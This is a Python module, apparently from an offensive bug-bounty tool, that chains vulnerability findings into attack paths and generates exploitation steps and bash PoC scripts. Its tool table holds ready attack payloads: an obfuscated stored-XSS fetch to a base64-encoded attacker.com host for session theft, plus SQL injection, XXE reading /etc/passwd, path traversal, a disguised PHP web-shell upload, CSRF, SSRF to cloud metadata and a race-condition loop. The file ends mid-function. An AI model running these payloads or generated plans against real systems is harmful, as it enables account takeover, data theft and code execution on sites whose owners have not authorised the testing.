"""
Super Monster v1.0.0 - Attack Planner Module

Build attack graphs from correlated findings and generate
step-by-step exploitation plans:

- Attack graph: nodes=states, edges=exploits/findings
- BFS shortest path from 'unauthenticated' to 'critical impact'
- Step-by-step exploitation plans with numbered steps
- ASCII art attack tree visualization (box-drawing characters)
- Tool suggestions for each step (curl commands, burp extensions, etc.)
- Combined PoC templates (shell scripts with curl commands)
- Risk assessment per attack path (likelihood, impact, complexity)
- Professional colored output
"""

import hashlib
import json
import os
import random
import re
import sys
import time
import uuid
from collections import defaultdict, deque
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import urlparse, quote

try:
    from colorama import Fore, Back, Style, init as colorama_init
    colorama_init(autoreset=True)
except ImportError:
    class _FakeColor:
        def __getattr__(self, name):
            return ""
    Fore = _FakeColor()
    Back = _FakeColor()
    Style = _FakeColor()

from super_monster.config import (
    Colors, SEVERITY_LEVELS, SEVERITY_ORDER, TOOL_BANNER,
    DEFAULT_OUTPUT_DIR, FINDING_TYPE_SEVERITY_MAP, CWE_MAPPING,
    BOUNTY_ESTIMATES, CORRELATION_RULES, DOMAIN_TIERS,
    get_domain_tier, get_bounty_estimate,
)
from super_monster.finding_db import FindingDB, Finding


# =============================================================================
# CONSTANTS
# =============================================================================

# Attack graph node states
STATE_UNAUTHENTICATED = "unauthenticated"
STATE_RECON_COMPLETE = "recon_complete"
STATE_INITIAL_ACCESS = "initial_access"
STATE_AUTHENTICATED = "authenticated"
STATE_PRIVILEGED = "privileged"
STATE_ADMIN = "admin_access"
STATE_DATA_ACCESS = "data_access"
STATE_CODE_EXECUTION = "code_execution"
STATE_PERSISTENCE = "persistence"
STATE_LATERAL_MOVEMENT = "lateral_movement"
STATE_CRITICAL_IMPACT = "critical_impact"

ALL_STATES = [
    STATE_UNAUTHENTICATED,
    STATE_RECON_COMPLETE,
    STATE_INITIAL_ACCESS,
    STATE_AUTHENTICATED,
    STATE_PRIVILEGED,
    STATE_ADMIN,
    STATE_DATA_ACCESS,
    STATE_CODE_EXECUTION,
    STATE_PERSISTENCE,
    STATE_LATERAL_MOVEMENT,
    STATE_CRITICAL_IMPACT,
]

# State descriptions
STATE_DESCRIPTIONS = {
    STATE_UNAUTHENTICATED: "No access - external attacker perspective",
    STATE_RECON_COMPLETE: "Target enumerated, attack surface mapped",
    STATE_INITIAL_ACCESS: "Initial foothold gained via vulnerability",
    STATE_AUTHENTICATED: "Valid user session obtained",
    STATE_PRIVILEGED: "Elevated privileges within application",
    STATE_ADMIN: "Administrative access to application/system",
    STATE_DATA_ACCESS: "Access to sensitive data stores",
    STATE_CODE_EXECUTION: "Arbitrary code execution on target",
    STATE_PERSISTENCE: "Persistent access established",
    STATE_LATERAL_MOVEMENT: "Moved to adjacent systems/services",
    STATE_CRITICAL_IMPACT: "Maximum impact achieved - full compromise",
}

# Finding type to state transitions
FINDING_STATE_TRANSITIONS = {
    "info_disclosure": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
    "version_disclosure": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
    "directory_listing": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
    "graphql_introspection": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
    "dns_misconfiguration": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
    "subdomain_takeover": (STATE_UNAUTHENTICATED, STATE_INITIAL_ACCESS),
    "open_redirect": (STATE_UNAUTHENTICATED, STATE_INITIAL_ACCESS),
    "cors": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "xss_reflected": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "xss_stored": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "xss_dom": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "csrf": (STATE_AUTHENTICATED, STATE_PRIVILEGED),
    "session_fixation": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "session_hijack": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "cookie_theft": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "auth_bypass": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "default_credentials": (STATE_UNAUTHENTICATED, STATE_ADMIN),
    "weak_password": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "credential_exposure": (STATE_RECON_COMPLETE, STATE_AUTHENTICATED),
    "api_key_leak": (STATE_RECON_COMPLETE, STATE_AUTHENTICATED),
    "idor": (STATE_AUTHENTICATED, STATE_DATA_ACCESS),
    "broken_access_control": (STATE_AUTHENTICATED, STATE_PRIVILEGED),
    "privilege_escalation": (STATE_AUTHENTICATED, STATE_ADMIN),
    "sqli": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "sqli_blind": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "sqli_error": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "ssrf": (STATE_AUTHENTICATED, STATE_LATERAL_MOVEMENT),
    "ssrf_blind": (STATE_AUTHENTICATED, STATE_RECON_COMPLETE),
    "cloud_metadata": (STATE_LATERAL_MOVEMENT, STATE_CRITICAL_IMPACT),
    "file_upload": (STATE_AUTHENTICATED, STATE_CODE_EXECUTION),
    "unrestricted_upload": (STATE_AUTHENTICATED, STATE_CODE_EXECUTION),
    "rce": (STATE_INITIAL_ACCESS, STATE_CODE_EXECUTION),
    "ssti": (STATE_INITIAL_ACCESS, STATE_CODE_EXECUTION),
    "deserialization": (STATE_INITIAL_ACCESS, STATE_CODE_EXECUTION),
    "xxe": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "lfi": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "rfi": (STATE_UNAUTHENTICATED, STATE_CODE_EXECUTION),
    "path_traversal": (STATE_UNAUTHENTICATED, STATE_DATA_ACCESS),
    "race_condition": (STATE_AUTHENTICATED, STATE_PRIVILEGED),
    "business_logic": (STATE_AUTHENTICATED, STATE_PRIVILEGED),
    "payment_bypass": (STATE_AUTHENTICATED, STATE_CRITICAL_IMPACT),
    "jwt_vulnerability": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "websocket_hijack": (STATE_UNAUTHENTICATED, STATE_AUTHENTICATED),
    "prototype_pollution": (STATE_UNAUTHENTICATED, STATE_CODE_EXECUTION),
    "header_injection": (STATE_UNAUTHENTICATED, STATE_INITIAL_ACCESS),
    "crlf_injection": (STATE_UNAUTHENTICATED, STATE_INITIAL_ACCESS),
    "cache_poisoning": (STATE_INITIAL_ACCESS, STATE_CRITICAL_IMPACT),
    "clickjacking": (STATE_UNAUTHENTICATED, STATE_INITIAL_ACCESS),
    "pii_leak": (STATE_DATA_ACCESS, STATE_CRITICAL_IMPACT),
    "data_exposure": (STATE_AUTHENTICATED, STATE_DATA_ACCESS),
    "missing_headers": (STATE_UNAUTHENTICATED, STATE_UNAUTHENTICATED),
    "cookie_flags": (STATE_UNAUTHENTICATED, STATE_UNAUTHENTICATED),
    "tls_misconfiguration": (STATE_UNAUTHENTICATED, STATE_RECON_COMPLETE),
}

# Tool recommendations by finding type
TOOL_RECOMMENDATIONS = {
    "sqli": {
        "primary": "sqlmap",
        "secondary": ["Burp Suite Intruder", "Havij"],
        "curl_template": "curl -s '{url}' --data '{param}=1' OR 1=1--'",
        "description": "Automated SQL injection exploitation",
    },
    "xss_reflected": {
        "primary": "dalfox",
        "secondary": ["Burp Suite", "XSS Hunter", "kxss"],
        "curl_template": "curl -s '{url}?{param}=<script>alert(1)</script>'",
        "description": "Reflected XSS exploitation and payload crafting",
    },
    "xss_stored": {
        "primary": "XSS Hunter",
        "secondary": ["Burp Suite", "beef-xss"],
        "curl_template": "curl -s '{url}' --data '{param}=<img src=x onerror=fetch(atob(\"aHR0cHM6Ly9hdHRhY2tlci5jb20v\"))>'",
        "description": "Stored XSS for persistent session theft",
    },
    "ssrf": {
        "primary": "Burp Collaborator",
        "secondary": ["interact.sh", "ssrfmap"],
        "curl_template": "curl -s '{url}' --data 'url=http://169.254.169.254/latest/meta-data/'",
        "description": "SSRF exploitation for internal service access",
    },
    "cors": {
        "primary": "CORScanner",
        "secondary": ["Burp Suite"],
        "curl_template": "curl -s -H 'Origin: https://evil.com' '{url}' -I",
        "description": "CORS misconfiguration exploitation",
    },
    "idor": {
        "primary": "Burp Autorize",
        "secondary": ["Postman", "ffuf"],
        "curl_template": "curl -s -H 'Cookie: session={token}' '{url}/api/users/{other_id}'",
        "description": "IDOR enumeration and data extraction",
    },
    "auth_bypass": {
        "primary": "Burp Suite",
        "secondary": ["ffuf", "wfuzz"],
        "curl_template": "curl -s '{url}/admin' -H 'X-Forwarded-For: 127.0.0.1'",
        "description": "Authentication bypass techniques",
    },
    "file_upload": {
        "primary": "fuxploider",
        "secondary": ["Burp Suite", "weevely"],
        "curl_template": "curl -s '{url}/upload' -F 'file=@shell.php;type=image/png'",
        "description": "File upload bypass and web shell deployment",
    },
    "subdomain_takeover": {
        "primary": "subjack",
        "secondary": ["nuclei", "can-i-take-over-xyz"],
        "curl_template": "dig CNAME {subdomain} && curl -s 'http://{subdomain}'",
        "description": "Subdomain takeover claim and exploitation",
    },
    "rce": {
        "primary": "Burp Suite",
        "secondary": ["Metasploit", "reverse-shell-generator"],
        "curl_template": "curl -s '{url}' --data 'cmd=id'",
        "description": "Remote code execution and shell access",
    },
    "open_redirect": {
        "primary": "OpenRedireX",
        "secondary": ["Burp Suite"],
        "curl_template": "curl -s -L '{url}?redirect=https://evil.com/'",
        "description": "Open redirect for phishing campaigns",
    },
    "xxe": {
        "primary": "XXEinjector",
        "secondary": ["Burp Suite"],
        "curl_template": "curl -s '{url}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'",
        "description": "XML External Entity injection",
    },
    "ssti": {
        "primary": "tplmap",
        "secondary": ["Burp Suite"],
        "curl_template": "curl -s '{url}?{param}={{{{7*7}}}}'",
        "description": "Server-Side Template Injection",
    },
    "race_condition": {
        "primary": "Turbo Intruder",
        "secondary": ["racepwn", "Burp Suite"],
        "curl_template": "for i in $(seq 1 50); do curl -s '{url}' --data 'action=redeem&code=PROMO' & done; wait",
        "description": "Race condition exploitation via concurrent requests",
    },
    "csrf": {
        "primary": "Burp CSRF PoC Generator",
        "secondary": ["custom HTML"],
        "curl_template": "curl -s '{url}' -H 'Cookie: session={token}' --data 'action=change_email&email=attacker@evil.com'",
        "description": "Cross-Site Request Forgery exploitation",
    },
    "path_traversal": {
        "primary": "dotdotpwn",
        "secondary": ["Burp Suite", "ffuf"],
        "curl_template": "curl -s '{url}?file=../../../etc/passwd'",
        "description": "Path traversal for sensitive file access",
    },
    "jwt_vulnerability": {
        "primary": "jwt_tool",
        "secondary": ["Burp Suite JWT Editor"],
        "curl_template": "python3 jwt_tool.py {token} -X a",
        "description": "JWT token manipulation and forging",
    },
}

# Complexity scoring
COMPLEXITY_SCORES = {
    STATE_UNAUTHENTICATED: 0,
    STATE_RECON_COMPLETE: 1,
    STATE_INITIAL_ACCESS: 2,
    STATE_AUTHENTICATED: 3,
    STATE_PRIVILEGED: 4,
    STATE_ADMIN: 5,
    STATE_DATA_ACCESS: 4,
    STATE_CODE_EXECUTION: 6,
    STATE_PERSISTENCE: 7,
    STATE_LATERAL_MOVEMENT: 5,
    STATE_CRITICAL_IMPACT: 8,
}

# ASCII box drawing characters
BOX_CHARS = {
    "top_left": "+-",
    "top_right": "-+",
    "bottom_left": "+-",
    "bottom_right": "-+",
    "horizontal": "-",
    "vertical": "|",
    "t_down": "+-",
    "t_up": "+-",
    "t_right": "|-",
    "t_left": "-|",
    "cross": "+-",
    "arrow_right": "-->",
    "arrow_down": " | ",
    "arrow_v": " V ",
    "node_left": "[",
    "node_right": "]",
    "edge": "---",
}


# =============================================================================
# DATA CLASSES
# =============================================================================

@dataclass
class AttackNode:
    """A node in the attack graph representing a state."""
    state: str = ""
    description: str = ""
    findings: list = field(default_factory=list)
    reachable: bool = False
    depth: int = -1
    parent_edge: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackEdge:
    """An edge in the attack graph representing an exploit/transition."""
    id: str = ""
    source_state: str = ""
    target_state: str = ""
    finding_type: str = ""
    finding_id: str = ""
    finding_title: str = ""
    finding_url: str = ""
    severity: str = ""
    cvss_score: float = 0.0
    tool: str = ""
    complexity: str = "medium"
    description: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackPath:
    """A complete attack path from start to goal."""
    path_id: str = ""
    states: list = field(default_factory=list)
    edges: list = field(default_factory=list)
    findings_used: list = field(default_factory=list)
    total_steps: int = 0
    start_state: str = ""
    end_state: str = ""
    likelihood: float = 0.0
    impact: float = 0.0
    complexity: float = 0.0
    risk_score: float = 0.0
    estimated_time_hours: float = 0.0
    tools_needed: list = field(default_factory=list)
    description: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)

    def calculate_risk(self) -> float:
        """Calculate composite risk score."""
        self.risk_score = round(
            (self.likelihood * 0.4 + self.impact * 0.4 + (1.0 - self.complexity) * 0.2) * 10, 2
        )
        return self.risk_score


@dataclass
class ExploitationStep:
    """A single step in an exploitation plan."""
    step_number: int = 0
    action: str = ""
    description: str = ""
    finding_type: str = ""
    finding_id: str = ""
    target_url: str = ""
    tool: str = ""
    command: str = ""
    expected_result: str = ""
    state_before: str = ""
    state_after: str = ""
    notes: list = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class AttackPlan:
    """A complete attack plan with steps and metadata."""
    plan_id: str = ""
    title: str = ""
    target_domain: str = ""
    generated_at: str = ""
    attack_paths: list = field(default_factory=list)
    exploitation_steps: list = field(default_factory=list)
    poc_script: str = ""
    tools_required: list = field(default_factory=list)
    estimated_time_hours: float = 0.0
    estimated_bounty: float = 0.0
    risk_assessment: dict = field(default_factory=dict)
    ascii_tree: str = ""
    findings_count: int = 0
    max_severity: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


# =============================================================================
# ATTACK GRAPH CLASS
# =============================================================================

class AttackGraph:
    """
    Directed graph representing possible attack paths.
    
    Nodes are attacker states (unauthenticated, authenticated, admin, etc.)
    Edges are exploits/vulnerabilities that enable state transitions.
    """

    def __init__(self):
        """Initialize empty attack graph."""
        self.nodes: Dict[str, AttackNode] = {}
        self.edges: Dict[str, AttackEdge] = {}
        self.adjacency: Dict[str, List[str]] = defaultdict(list)
        self._edge_count = 0

        # Initialize all possible states
        for state in ALL_STATES:
            self.nodes[state] = AttackNode(
                state=state,
                description=STATE_DESCRIPTIONS.get(state, ""),
            )

    def add_edge(self, source: str, target: str, finding: Finding) -> str:
        """
        Add an edge (exploit) to the graph.

        Args:
            source: Source state.
            target: Target state.
            finding: The finding enabling this transition.

        Returns:
            Edge ID.
        """
        if source not in self.nodes or target not in self.nodes:
            return ""
        if source == target:
            return ""

        self._edge_count += 1
        edge_id = f"E-{self._edge_count:04d}"

        # Get tool recommendation
        tool_info = TOOL_RECOMMENDATIONS.get(finding.finding_type, {})
        primary_tool = tool_info.get("primary", "Manual testing")

        edge = AttackEdge(
            id=edge_id,
            source_state=source,
            target_state=target,
            finding_type=finding.finding_type,
            finding_id=finding.id,
            finding_title=finding.title[:60],
            finding_url=finding.url,
            severity=finding.severity,
            cvss_score=finding.cvss_score,
            tool=primary_tool,
            complexity=self._estimate_complexity(finding),
            description=f"Exploit {finding.finding_type} to transition from {source} to {target}",
        )

        self.edges[edge_id] = edge
        self.adjacency[source].append(edge_id)

        # Mark target as reachable
        self.nodes[target].reachable = True
        self.nodes[target].findings.append(finding.id)
        self.nodes[source].findings.append(finding.id)

        return edge_id

    def _estimate_complexity(self, finding: Finding) -> str:
        """Estimate exploitation complexity."""
        high_complexity = {"sqli_blind", "race_condition", "deserialization", "ssti", "xxe"}
        low_complexity = {"open_redirect", "cors", "missing_headers", "info_disclosure", "directory_listing"}

        if finding.finding_type in high_complexity:
            return "high"
        elif finding.finding_type in low_complexity:
            return "low"
        return "medium"

    def find_shortest_path_bfs(self, start: str, goal: str) -> Optional[List[str]]:
        """
        Find shortest path from start to goal state using BFS.

        Args:
            start: Starting state.
            goal: Goal state.

        Returns:
            List of edge IDs forming the shortest path, or None.
        """
        if start not in self.nodes or goal not in self.nodes:
            return None

        visited = set()
        queue = deque()
        queue.append((start, []))
        visited.add(start)

        while queue:
            current_state, path_edges = queue.popleft()

            if current_state == goal:
                return path_edges

            for edge_id in self.adjacency.get(current_state, []):
                edge = self.edges.get(edge_id)
                if edge and edge.target_state not in visited:
                    visited.add(edge.target_state)
                    queue.append((edge.target_state, path_edges + [edge_id]))

        return None

    def find_all_paths(self, start: str, goal: str, max_depth: int = 8) -> List[List[str]]:
        """
        Find all paths from start to goal using DFS with depth limit.

        Args:
            start: Starting state.
            goal: Goal state.
            max_depth: Maximum path depth.

        Returns:
            List of paths, each a list of edge IDs.
        """
        all_paths = []

        def dfs(current: str, path: List[str], visited: Set[str], depth: int):
            if depth > max_depth:
                return
            if current == goal:
                all_paths.append(path[:])
                return
            for edge_id in self.adjacency.get(current, []):
                edge = self.edges.get(edge_id)
                if edge and edge.target_state not in visited:
                    visited.add(edge.target_state)
                    path.append(edge_id)
                    dfs(edge.target_state, path, visited, depth + 1)
                    path.pop()
                    visited.discard(edge.target_state)

        dfs(start, [], {start}, 0)
        return all_paths

    def get_reachable_states(self, start: str) -> Set[str]:
        """Get all states reachable from start via BFS."""
        visited = set()
        queue = deque([start])
        visited.add(start)

        while queue:
            current = queue.popleft()
            for edge_id in self.adjacency.get(current, []):
                edge = self.edges.get(edge_id)
                if edge and edge.target_state not in visited:
                    visited.add(edge.target_state)
                    queue.append(edge.target_state)

        return visited

    def get_graph_stats(self) -> Dict[str, Any]:
        """Get graph statistics."""
        reachable_from_unauth = self.get_reachable_states(STATE_UNAUTHENTICATED)
        return {
            "total_nodes": len(self.nodes),
            "total_edges": len(self.edges),
            "reachable_states": len(reachable_from_unauth),
            "unreachable_states": len(self.nodes) - len(reachable_from_unauth),
            "max_out_degree": max(
                (len(edges) for edges in self.adjacency.values()), default=0
            ),
            "states_with_edges": len([s for s in self.adjacency if self.adjacency[s]]),
        }


# =============================================================================
# ATTACK PLANNER CLASS
# =============================================================================

class AttackPlanner:
    """
    Attack plan generator from correlated findings.

    Builds attack graphs, finds exploitation paths, generates
    step-by-step plans with tool recommendations and PoC templates.
    """

    def __init__(self, db: FindingDB = None, output_dir: str = None):
        """
        Initialize the AttackPlanner.

        Args:
            db: FindingDB instance with findings.
            output_dir: Directory for saving output.
        """
        self.db = db
        self.output_dir = output_dir or DEFAULT_OUTPUT_DIR
        self.graph = AttackGraph()
        self._plans: List[AttackPlan] = []
        self._findings_used: Set[str] = set()

    def build_graph(self, findings: List[Finding] = None) -> AttackGraph:
        """
        Build attack graph from findings.

        Maps each finding to a state transition edge based on its type.

        Args:
            findings: List of findings to process.

        Returns:
            Populated AttackGraph.
        """
        if findings is None:
            if self.db:
                findings = self.db.get_all()
            else:
                findings = []

        self.graph = AttackGraph()

        for finding in findings:
            ftype = finding.finding_type.lower()
            transition = FINDING_STATE_TRANSITIONS.get(ftype)

            if transition:
                source, target = transition
                if source != target:  # Skip self-loops
                    self.graph.add_edge(source, target, finding)

        return self.graph

    def find_attack_paths(self, start: str = STATE_UNAUTHENTICATED,
                          goal: str = STATE_CRITICAL_IMPACT) -> List[AttackPath]:
        """
        Find attack paths from start to goal state.

        Uses BFS for shortest path and DFS for all paths.

        Args:
            start: Starting state (default: unauthenticated).
            goal: Goal state (default: critical_impact).

        Returns:
            List of AttackPath objects sorted by risk.
        """
        paths = []

        # Find shortest path
        shortest = self.graph.find_shortest_path_bfs(start, goal)
        if shortest:
            path = self._build_attack_path(shortest, start, goal, is_shortest=True)
            if path:
                paths.append(path)

        # Find alternative paths
        all_edge_paths = self.graph.find_all_paths(start, goal, max_depth=6)
        for edge_path in all_edge_paths[:10]:
            if edge_path != shortest:
                path = self._build_attack_path(edge_path, start, goal)
                if path:
                    paths.append(path)

        # If no path to critical impact, try intermediate goals
        if not paths:
            intermediate_goals = [
                STATE_ADMIN, STATE_CODE_EXECUTION, STATE_DATA_ACCESS,
                STATE_PRIVILEGED, STATE_AUTHENTICATED,
            ]
            for goal_state in intermediate_goals:
                alt_shortest = self.graph.find_shortest_path_bfs(start, goal_state)
                if alt_shortest:
                    path = self._build_attack_path(alt_shortest, start, goal_state)
                    if path:
                        paths.append(path)
                    break

        # Sort by risk score
        for p in paths:
            p.calculate_risk()
        paths.sort(key=lambda p: p.risk_score, reverse=True)

        return paths[:10]

    def _build_attack_path(self, edge_ids: List[str], start: str,
                           goal: str, is_shortest: bool = False) -> Optional[AttackPath]:
        """Build an AttackPath from a list of edge IDs."""
        if not edge_ids:
            return None

        path = AttackPath(
            path_id=f"PATH-{uuid.uuid4().hex[:6].upper()}",
            start_state=start,
            end_state=goal,
            total_steps=len(edge_ids),
        )

        states = [start]
        findings_used = []
        tools = set()
        total_complexity = 0.0
        total_cvss = 0.0

        for edge_id in edge_ids:
            edge = self.graph.edges.get(edge_id)
            if not edge:
                continue

            states.append(edge.target_state)
            path.edges.append(edge.to_dict())
            findings_used.append({
                "id": edge.finding_id,
                "type": edge.finding_type,
                "title": edge.finding_title,
                "severity": edge.severity,
                "url": edge.finding_url,
            })
            tools.add(edge.tool)
            total_cvss += edge.cvss_score

            # Complexity scoring
            if edge.complexity == "high":
                total_complexity += 0.8
            elif edge.complexity == "medium":
                total_complexity += 0.5
            else:
                total_complexity += 0.2

        path.states = states
        path.findings_used = findings_used
        path.tools_needed = sorted(list(tools))

        # Calculate metrics
        num_steps = len(edge_ids)
        path.complexity = min(total_complexity / max(num_steps, 1), 1.0)
        path.impact = min(COMPLEXITY_SCORES.get(goal, 5) / 8.0, 1.0)
        path.likelihood = min((total_cvss / max(num_steps, 1)) / 10.0, 1.0)
        path.estimated_time_hours = num_steps * 1.5  # Rough estimate

        # Description
        if is_shortest:
            path.description = f"Shortest path: {' -> '.join(states)} ({num_steps} steps)"
        else:
            path.description = f"Alternative path: {' -> '.join(states)} ({num_steps} steps)"

        return path

    def generate_exploitation_steps(self, path: AttackPath) -> List[ExploitationStep]:
        """
        Generate detailed exploitation steps for an attack path.

        Args:
            path: The AttackPath to generate steps for.

        Returns:
            List of ExploitationStep objects.
        """
        steps = []
        step_num = 0

        for edge_dict in path.edges:
            step_num += 1
            finding_type = edge_dict.get("finding_type", "")
            tool_info = TOOL_RECOMMENDATIONS.get(finding_type, {})

            # Generate curl command
            url = edge_dict.get("finding_url", "https://target.com")
            curl_template = tool_info.get("curl_template", f"curl -s '{url}'")
            command = curl_template.replace("{url}", url).replace("{param}", "param")
            command = command.replace("{subdomain}", urlparse(url).netloc if url else "target")
            command = command.replace("{token}", "SESSION_TOKEN")
            command = command.replace("{other_id}", "2")

            step = ExploitationStep(
                step_number=step_num,
                action=f"Exploit {finding_type}",
                description=tool_info.get("description", f"Exploit {finding_type} vulnerability"),
                finding_type=finding_type,
                finding_id=edge_dict.get("finding_id", ""),
                target_url=url,
                tool=edge_dict.get("tool", "Manual"),
                command=command,
                expected_result=f"Transition to {edge_dict.get('target_state', 'next state')}",
                state_before=edge_dict.get("source_state", ""),
                state_after=edge_dict.get("target_state", ""),
                notes=[
                    f"Severity: {edge_dict.get('severity', 'MEDIUM')}",
                    f"CVSS: {edge_dict.get('cvss_score', 0.0)}",
                ],
            )
            steps.append(step)

        return steps

    def generate_poc_script(self, path: AttackPath,
                            steps: List[ExploitationStep]) -> str:
        """
        Generate a PoC shell script for the attack path.

        Args:
            path: The attack path.
            steps: The exploitation steps.

        Returns:
            Shell script content as string.
        """
        lines = [
            "#!/bin/bash",
            "#",
            f"# Super Monster PoC Script - {path.path_id}",
            f"# Generated: {datetime.utcnow().isoformat()}",
            f"# Path: {' -> '.join(path.states)}",
            f"# Steps: {path.total_steps}",
            f"# Risk Score: {path.risk_score}",
            "#",
            "# DISCLAIMER: For authorized testing only.",
            "# Unauthorized access is illegal.",
            "#",
            "",
            "set -e",
            "",
            "# Configuration",
            'TARGET="${1:-https://target.example.com}"',
            'COOKIE=""',
            'TOKEN=""',
            'OUTPUT_DIR="./poc_output"',
            "",
            'mkdir -p "$OUTPUT_DIR"',
            "",
            'echo "[*] Super Monster PoC - Attack Path Exploitation"',
            f'echo "[*] Path: {path.path_id}"',
            f'echo "[*] Steps: {path.total_steps}"',
            'echo ""',
            "",
        ]

        for step in steps:
            lines.append(f"# Step {step.step_number}: {step.action}")
            lines.append(f'echo "[{step.step_number}/{len(steps)}] {step.action}"')
            lines.append(f'echo "  Tool: {step.tool}"')
            lines.append(f'echo "  Target: {step.target_url}"')
            lines.append("")

            # Add the actual command
            cmd = step.command.replace("'", "'\''") if step.command else f"curl -s '{step.target_url}'"
            lines.append(f"# Execute exploit")
            lines.append(f'RESPONSE=$(curl -s -w "\n%{{http_code}}" "{step.target_url}" 2>/dev/null || true)')
            lines.append(f'HTTP_CODE=$(echo "$RESPONSE" | tail -1)')
            lines.append(f'BODY=$(echo "$RESPONSE" | sed \'$d\')')
            lines.append("")
            lines.append(f'echo "  HTTP Status: $HTTP_CODE"')
            lines.append(f'echo "$BODY" > "$OUTPUT_DIR/step{step.step_number}_response.txt"')
            lines.append(f'echo "  Response saved to: $OUTPUT_DIR/step{step.step_number}_response.txt"')
            lines.append("")

            if step.state_after == STATE_AUTHENTICATED:
                lines.append("# Extract session token if available")
                lines.append('COOKIE=$(echo "$BODY" | grep -oP "session=[^;]+" || true)')
                lines.append('if [ -n "$COOKIE" ]; then')
                lines.append('  echo "  [+] Session obtained: $COOKIE"')
                lines.append("fi")
                lines.append("")

            lines.append(f'echo "  Expected: {step.expected_result}"')
            lines.append('echo ""')
            lines.append("sleep 1  # Rate limiting")
            lines.append("")

        lines.extend([
            'echo ""',
            'echo "[*] PoC execution complete"',
            f'echo "[*] Results saved to: $OUTPUT_DIR"',
            'echo "[*] Review output files for exploitation evidence"',
        ])

        return "\n".join(lines)

    def generate_ascii_tree(self, paths: List[AttackPath]) -> str:
        """
        Generate ASCII art attack tree visualization.

        Args:
            paths: List of attack paths to visualize.

        Returns:
            ASCII art string.
        """
        if not paths:
            return "  No attack paths found."

        lines = []
        lines.append("")
        lines.append("  ATTACK TREE VISUALIZATION")
        lines.append("  " + "=" * 60)
        lines.append("")

        # Show the graph structure
        lines.append("  [ATTACKER] (unauthenticated)")
        lines.append("       |")

        # Build tree from paths
        shown_edges = set()

        for path_idx, path in enumerate(paths[:5]):
            if path_idx > 0:
                lines.append("       |")
                lines.append(f"  [Alternative Path {path_idx + 1}]")
                lines.append("       |")

            prev_state = path.states[0] if path.states else STATE_UNAUTHENTICATED

            for i, edge_dict in enumerate(path.edges):
                source = edge_dict.get("source_state", "")
                target = edge_dict.get("target_state", "")
                ftype = edge_dict.get("finding_type", "?")
                severity = edge_dict.get("severity", "INFO")

                edge_key = f"{source}->{target}:{ftype}"
                if edge_key in shown_edges:
                    continue
                shown_edges.add(edge_key)

                # Draw the edge
                indent = "       " + "    " * min(i, 3)
                arrow = "|"
                lines.append(f"{indent}{arrow}")
                lines.append(f"{indent}+-- [{ftype}] ({severity})")
                lines.append(f"{indent}|   via: {edge_dict.get('finding_title', '?')[:40]}")
                lines.append(f"{indent}{arrow}")
                lines.append(f"{indent}V")

                # Draw the target node
                state_label = target.upper().replace("_", " ")
                box_width = len(state_label) + 4
                lines.append(f"{indent}+{'-' * box_width}+")
                lines.append(f"{indent}| {state_label}  |")
                lines.append(f"{indent}+{'-' * box_width}+")

        lines.append("")
        lines.append("  " + "=" * 60)
        lines.append(f"  Total paths: {len(paths)}")
        if paths:
            lines.append(f"  Shortest path: {paths[0].total_steps} steps")
            lines.append(f"  Highest risk: {paths[0].risk_score:.1f}/10")
        lines.append("")

        return "\n".join(lines)

    def generate_plan(self, findings: List[Finding] = None,
                      target_domain: str = None) -> AttackPlan:
        """
        Generate a complete attack plan.

        Args:
            findings: Findings to plan around.
            target_domain: Optional domain filter.

        Returns:
            Complete AttackPlan.
        """
        if findings is None:
            if self.db:
                findings = self.db.get_all()
            else:
                findings = []

        # Filter by domain if specified
        if target_domain:
            findings = [f for f in findings if target_domain.lower() in (f.domain or "").lower()]

        if not findings:
            return AttackPlan(
                plan_id=f"PLAN-{uuid.uuid4().hex[:6].upper()}",
                title="No findings available",
                generated_at=datetime.utcnow().isoformat(),
            )

        # Build graph
        self.build_graph(findings)

        # Find attack paths
        paths = self.find_attack_paths()

        # Generate steps for best path
        steps = []
        if paths:
            steps = self.generate_exploitation_steps(paths[0])

        # Generate PoC
        poc_script = ""
        if paths and steps:
            poc_script = self.generate_poc_script(paths[0], steps)

        # Generate ASCII tree
        ascii_tree = self.generate_ascii_tree(paths)

        # Collect tools
        all_tools = set()
        for path in paths:
            all_tools.update(path.tools_needed)

        # Calculate bounty estimate
        max_severity = "INFO"
        for f in findings:
            if SEVERITY_ORDER.get(f.severity, 0) > SEVERITY_ORDER.get(max_severity, 0):
                max_severity = f.severity
        bounty = get_bounty_estimate(max_severity)

        # Determine domain
        domain = target_domain or ""
        if not domain and findings:
            domains = [f.domain for f in findings if f.domain]
            if domains:
                domain = max(set(domains), key=domains.count)

        # Risk assessment
        risk_assessment = self._calculate_risk_assessment(paths, findings)

        plan = AttackPlan(
            plan_id=f"PLAN-{uuid.uuid4().hex[:6].upper()}",
